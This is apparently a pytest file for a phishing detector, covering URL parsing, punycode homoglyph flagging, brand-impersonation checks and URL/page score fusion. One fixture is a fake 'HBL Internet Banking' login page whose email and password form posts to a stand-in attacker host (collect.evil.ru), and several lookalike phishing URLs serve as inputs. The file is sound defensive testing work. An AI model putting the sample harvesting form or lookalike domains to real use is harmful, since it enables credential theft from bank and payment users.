"""URL v10 preprocessing, page summary (train/serve parity), brand list additions, URL+page fusion modes."""
import os

from AIML.url.brand_engine import check_brand_impersonation
from AIML.url.page_summary import signals_from_html, summary_from_html, summary_from_signals
from AIML.url.urlnet_v10 import char_ids, model_text, structure


def test_registered_domain_is_explicit_under_subdomain_injection():
    s = structure("https://www.paypal.com.secure-login.xyz/signin")
    assert s["reg"] == "secure-login.xyz" and s["sub"] == "www.paypal.com"


def test_punycode_homoglyph_is_decoded_and_flagged():
    t = model_text("https://xn--pypal-4ve.com/login")       # pаypal with a Cyrillic а
    assert "idn" in t and "confusable" in t and "[domain] paypal.com" in t


def test_plain_accented_idn_is_not_called_confusable():
    t = model_text("https://xn--mnchen-3ya.de/")            # münchen.de
    assert "idn" in t and "confusable" not in t


def test_private_suffix_and_ip_and_port():
    assert structure("https://alice.github.io/x")["reg"] == "alice.github.io"
    s = structure("http://192.168.1.5:8080/a")
    assert {"ip", "port", "http"} <= set(s["flags"])


def test_char_ids_shape_and_padding():
    t = char_ids(["abc", ""])
    assert t.shape == (2, 200) and int(t[1].sum()) == 0 and int(t[0, 3]) == 0


HTML = ('<html><head><title>HBL Internet Banking</title><script>var a=1</script></head><body><h1>Sign in</h1>'
        '<form action="https://collect.evil.ru/p.php"><input type="email"><input type="password"></form></body></html>')


def test_page_summary_same_from_html_and_from_extension_signals():
    url = "https://secure-hbl.top/login"
    sig = signals_from_html(url, HTML)
    assert sig["has_password"] and sig["has_email"] and sig["form_actions"] == ["https://collect.evil.ru/p.php"]
    assert summary_from_html(url, HTML, model_text(url)) == summary_from_signals(url, sig, model_text(url))
    s = summary_from_signals(url, sig, model_text(url))
    assert "[inputs] password email" in s and "submit external" in s and "HBL Internet Banking" in s


def test_form_without_action_submits_to_same_page():
    url = "https://example.org/login"
    sig = signals_from_html(url, "<form><input type=password></form>")
    assert "submit same" in summary_from_signals(url, sig, model_text(url))


def test_new_brands_flag_lookalikes_but_not_official_sites():
    assert check_brand_impersonation("https://wetransfer-download-files.ml/file/1")["matched"]
    assert check_brand_impersonation("https://jazzcash-verify.top/")["matched"]
    for ok in ("https://wetransfer.com/downloads/x", "https://www.jazzcash.com.pk/", "https://company.sharepoint.com/sites/x",
               "https://www.bankalfalah.com/", "https://www.adobe.com/acrobat"):
        assert not check_brand_impersonation(ok)["matched"], ok


def test_page_fusion_modes():
    from api.services.model_orchestrator import _combine_url_page
    old = os.environ.get("AEGIS_PAGE_FUSION")
    try:
        os.environ["AEGIS_PAGE_FUSION"] = "geo"
        assert abs(_combine_url_page(0.64, 0.25) - 0.4) < 1e-9
        os.environ["AEGIS_PAGE_FUSION"] = "max"
        assert _combine_url_page(0.2, 0.7) == 0.7
        os.environ["AEGIS_PAGE_FUSION"] = "page"
        assert _combine_url_page(0.2, 0.7) == 0.7
    finally:
        if old is None:
            os.environ.pop("AEGIS_PAGE_FUSION", None)
        else:
            os.environ["AEGIS_PAGE_FUSION"] = old


def test_page_model_skipped_without_credential_inputs():
    from api.services.model_orchestrator import _page_model_score
    assert _page_model_score("https://example.org/", {"visible_text": "hello"}) is None
    assert _page_model_score("https://example.org/", None) is None
